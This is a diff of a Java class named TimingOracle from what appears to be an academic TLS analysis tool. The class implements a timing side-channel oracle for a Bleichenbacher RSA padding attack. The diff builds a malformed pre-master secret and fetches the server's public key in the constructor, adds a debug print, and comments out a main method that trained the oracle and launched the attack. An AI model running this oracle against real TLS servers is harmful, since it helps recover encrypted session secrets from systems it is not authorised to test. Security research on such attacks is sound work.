@@ -4,27 +4,25 @@
  */
 package de.rub.nds.ssl.analyzer.attacker.bleichenbacher.oracles;
 
-import de.rub.nds.ssl.analyzer.attacker.Bleichenbacher;
 import de.rub.nds.ssl.analyzer.attacker.bleichenbacher.OracleException;
-import de.rub.nds.tinytlssocket.TLSServer;
 import de.rub.nds.ssl.stack.protocols.handshake.datatypes.PreMasterSecret;
 import de.rub.nds.ssl.stack.workflows.commons.ESupportedSockets;
+import de.rub.nds.tinytlssocket.TLSServer;
 import java.io.FileInputStream;
 import java.io.IOException;
 import java.io.InputStream;
 import java.net.SocketException;
 import java.security.*;
 import java.security.cert.CertificateException;
+import java.security.interfaces.RSAPublicKey;
 import java.util.ArrayList;
 import java.util.Arrays;
-import java.util.Enumeration;
 import java.util.logging.Level;
 import javax.crypto.BadPaddingException;
 import javax.crypto.Cipher;
 import javax.crypto.IllegalBlockSizeException;
 import javax.crypto.NoSuchPaddingException;
 import org.apache.log4j.Logger;
-import org.apache.log4j.PropertyConfigurator;
 import org.bouncycastle.jce.provider.BouncyCastleProvider;
 
 /**
@@ -159,15 +157,23 @@ public class TimingOracle extends ATimingOracle {
      * @throws SocketException
      */
     public TimingOracle(final String serverAddress, final int serverPort,
-            final PrivateKey privateKey, final OracleType oracleType)
+            final PrivateKey privateKey, final OracleType oracleType,
+            final byte[] validPMS)
             throws SocketException, NoSuchAlgorithmException,
-            InvalidKeyException, NoSuchPaddingException {
+            InvalidKeyException, NoSuchPaddingException, GeneralSecurityException, IOException {
         super(serverAddress, serverPort);
         Security.addProvider(new BouncyCastleProvider());
 
         this.oracleType = oracleType;
         cipher = Cipher.getInstance("RSA/None/NoPadding");
         cipher.init(Cipher.DECRYPT_MODE, privateKey);
+
+        setPlainPMS(new PreMasterSecret(validPMS));
+        byte[] plainPKCS_wrong = new byte[validPMS.length];
+        System.arraycopy(validPMS, 0, plainPKCS_wrong, 0, validPMS.length);
+        plainPKCS_wrong[0] = 23;
+        this.publicKey = (RSAPublicKey) fetchServerPublicKey(serverAddress, serverPort);
+        encPMSWrong = encryptHelper(plainPKCS_wrong, publicKey);
     }
 
     private boolean isValidPMS(byte[] testPMS) {
@@ -209,7 +215,7 @@ public class TimingOracle extends ATimingOracle {
             try {
                 executeWorkflow(testPMS, ESupportedSockets.TimingSocket);
                 measurementsTest[i] = getTimeDelay(getWorkflow().getTraceList());
-
+System.out.println("====> encPMS" + encPMSWrong[0]);
                 executeWorkflow(encPMSWrong, ESupportedSockets.TimingSocket);
                 measurementsInvalid[i] = getTimeDelay(getWorkflow().
                         getTraceList());
@@ -516,59 +522,55 @@ public class TimingOracle extends ATimingOracle {
         }
     }
 
-    public static void main(String[] args) {
-        PropertyConfigurator.configure("logging.properties");
-
-        try {
-            String keyName = "2048_rsa";
-            String keyPassword = "password";
-
-            KeyStore ks = loadKeyStore(new FileInputStream("2048.jks"),
-                    "password");
-            PublicKey publicKey = ks.getCertificate(keyName).getPublicKey();
-            PrivateKey privateKey = (PrivateKey) ks.getKey(keyName, keyPassword.
-                    toCharArray());
-
-            TimingOracle to = new TimingOracle(HOST, PORT,
-                    privateKey, OracleType.TTT);
-            // TODO: Start SSL-Server for testing purposes
-            to.setUp();
-
-            // a PMS is exactly 48 bytes long!
-            byte[] rawPMS = new byte[48];
-            System.arraycopy(plainPKCS, plainPKCS.length - 48, rawPMS, 0,
-                    rawPMS.length);
-            // it is necessary to set the plain PMS for a complete handshake
-            to.setPlainPMS(new PreMasterSecret(rawPMS));
-
-            byte[] plainPKCS_wrong = new byte[plainPKCS.length];
-            System.arraycopy(plainPKCS, 0, plainPKCS_wrong, 0, plainPKCS.length);
-            plainPKCS_wrong[0] = 23;
-
-            to.encPMS = encryptHelper(plainPKCS, publicKey);
-            to.encPMSWrong = encryptHelper(plainPKCS_wrong, publicKey);
-
-            to.trainOracle(to.encPMS, to.encPMSWrong);
-            to.plausibilityCheck();
-
-            Bleichenbacher attacker = new Bleichenbacher(to.encPMS, to, true);
-            attacker.attack();
-        } catch (InvalidKeyException ex) {
-            logger.error(ex.getMessage(), ex);
-        } catch (NoSuchPaddingException ex) {
-            logger.error(ex.getMessage(), ex);
-        } catch (UnrecoverableKeyException ex) {
-            logger.error(ex.getMessage(), ex);
-        } catch (KeyStoreException ex) {
-            logger.error(ex.getMessage(), ex);
-        } catch (NoSuchAlgorithmException ex) {
-            logger.error(ex.getMessage(), ex);
-        } catch (CertificateException ex) {
-            logger.error(ex.getMessage(), ex);
-        } catch (IOException ex) {
-            logger.error(ex.getMessage(), ex);
-        } catch (OracleException ex) {
-            logger.error(ex.getMessage(), ex);
-        }
-    }
+//    public static void main(String[] args) {
+//        PropertyConfigurator.configure("logging.properties");
+//
+//        try {
+//            String keyName = "2048_rsa";
+//            String keyPassword = "password";
+//
+//            KeyStore ks = loadKeyStore(new FileInputStream("2048.jks"),
+//                    "password");
+//            PublicKey publicKey = ks.getCertificate(keyName).getPublicKey();
+//            PrivateKey privateKey = (PrivateKey) ks.getKey(keyName, keyPassword.
+//                    toCharArray());
+//
+//            TimingOracle to = new TimingOracle(HOST, PORT,
+//                    privateKey, OracleType.TTT);
+//            // TODO: Start SSL-Server for testing purposes
+//            to.setUp();
+//
+//            // a PMS is exactly 48 bytes long!
+//            byte[] rawPMS = new byte[48];
+//            System.arraycopy(plainPKCS, plainPKCS.length - 48, rawPMS, 0,
+//                    rawPMS.length);
+//            // it is necessary to set the plain PMS for a complete handshake
+//            to.setPlainPMS(new PreMasterSecret(rawPMS));
+//
+//            byte[] plainPKCS_wrong = new byte[plainPKCS.length];
+//            System.arraycopy(plainPKCS, 0, plainPKCS_wrong, 0, plainPKCS.length);
+//            plainPKCS_wrong[0] = 23;
+//
+//            to.encPMS = encryptHelper(plainPKCS, publicKey);
+//            to.encPMSWrong = encryptHelper(plainPKCS_wrong, publicKey);
+//
+//            to.trainOracle(to.encPMS, to.encPMSWrong);
+//            to.plausibilityCheck();
+//
+//            Bleichenbacher attacker = new Bleichenbacher(to.encPMS, to, true);
+//            attacker.attack();
+//        } catch (UnrecoverableKeyException ex) {
+//            logger.error(ex.getMessage(), ex);
+//        } catch (KeyStoreException ex) {
+//            logger.error(ex.getMessage(), ex);
+//        } catch (NoSuchAlgorithmException ex) {
+//            logger.error(ex.getMessage(), ex);
+//        } catch (CertificateException ex) {
+//            logger.error(ex.getMessage(), ex);
+//        } catch (IOException ex) {
+//            logger.error(ex.getMessage(), ex);
+//        } catch (OracleException ex) {
+//            logger.error(ex.getMessage(), ex);
+//        }
+//    }
 }
